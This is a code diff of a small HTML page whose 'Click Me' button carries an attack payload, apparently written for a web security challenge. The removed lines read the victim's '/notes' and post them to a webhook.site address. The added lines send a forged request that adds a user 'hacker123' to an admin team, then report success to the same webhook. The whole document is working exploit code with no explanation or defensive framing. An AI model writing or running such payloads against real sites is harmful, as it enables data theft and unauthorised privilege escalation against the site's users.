@@ -1,11 +1,17 @@
 <html><body>
   <button id="installbutton" onclick="
-    fetch('/notes')
-      .then(r => r.text())
-      .then(f => fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
+    fetch('/api/teams/1/addUser/hacker123', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ csrfToken: 'admin_csrf' })
+    }).then(() => {
+      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
         method: 'POST',
         mode: 'no-cors',
-        body: f
-      }))
+        body: '✅ User hacker123 added to admin team!'
+      })
+    })
   ">Click Me</button>
 </body></html>
